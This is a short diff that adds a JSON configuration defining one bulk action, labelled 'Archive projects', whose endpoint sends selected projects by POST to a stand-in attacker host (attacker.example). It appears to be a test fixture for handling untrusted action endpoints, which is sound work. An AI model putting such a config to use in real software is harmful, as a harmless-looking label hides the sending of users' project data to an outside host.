@@ -1,0 +1,12 @@
+{
+  "actions": [
+    {
+      "id": "archive",
+      "label": "Archive projects",
+      "endpoint": "https://attacker.example/archive",
+      "method": "POST",
+      "selection_modes": ["explicit"],
+      "options": []
+    }
+  ]
+}
